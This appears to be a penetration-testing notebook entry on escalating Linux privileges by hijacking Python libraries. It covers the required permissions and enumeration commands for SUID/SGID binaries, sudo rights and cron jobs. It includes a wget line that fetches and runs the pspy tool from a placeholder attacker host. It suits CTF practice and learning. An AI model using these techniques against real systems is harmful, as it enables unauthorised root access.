---
Primary_category: "[[LINUX PRIVESC]]"
title: PYTHON LIBRARY HIJACKING
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
  - PythonLibraryHijacking
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

| **REFERENCES** | |
| --- | --- |
| ***Python Library Hijacking on Linux*** | ***[See here](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)*** |
| ***Privesc via Python Library Hijacking*** | ***[See here](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)*** |

#### Write Permissions on Imported Python Module

##### Requirements

- ***The Python Script must be executed by a user with more privileges that the current one***
<br>
- ***The current user must have read permissions on the Python Script***
<br>
- ***The current user must have write permissions on the Module importing the Python Script***

##### Scenarios & Cases

The situation that described by the first requirement can be projected in the following scenarios →

###### *SUID Binary*

The attacker finds a binary which has the *SUID* special permission enabled

```bash
find / -perm 4755 -type f -ls 2> /dev/null
find / -perm 4755 -user root -type f -ls 2> /dev/null # Root as File Owner
```

Therefore, It only remains to find the *Python Modules* that are being imported in the *Python Script*

###### *SGID Binary*

The same as [[#*SUID Binary*|here]]

```bash
find / -perm 2755 -type f -ls 2> /dev/null
find / -perm 2755 -group root -type f -ls 2> /dev/null # Root as File Owner
```

###### *Sudo Privilege*

The attacker checks if the current user has any type of *sudo privileges* as follows →

```bash
sudo -l
```

It appears that the user has privileges to execute as *Any User (ALL)* a particular *Python Script*

So, the same applies here, if the attacker has *read* permissions on the *Python Script*, just examine its content to see what modules it imports

###### *Cron Job*

There may be a *Cron Job* or task that is being executed recurrently on the system by a user with more privilieges than the current one

Download and transfer to the target a tool like ***[PsPy](https://github.com/DominicBreuker/pspy)*** to monitor them all

- ***From the Attacker***

```bash
curl --silent --request GET --remote-name --location "https://github.com/DominicBreuker/pspy/releases/download/vX.X.X/pspy64"
```

```bash
python3 -m http.server <PORT>
```

- ***From the Target***

```bash
wget "http://<ATTACKER>:<PORT>/pspy64" -O pspy64
```

```bash
chmod 700 !$ && ./pspy64
```

Once the attacker finds that mentioned *Cron Job* which executes a *Python Script*, he just need *read* permissions on it to check its content and see what *Python Modules* it imports

> [!BUG]- Important
>
> As mentioned earlier, the current user must have *write permissions* on the *imported python module* in order to modify it and escalate privileges when the privileged user executes the script
>

##### Examples

> ***[[FRIENDZONE|FriendZone]]***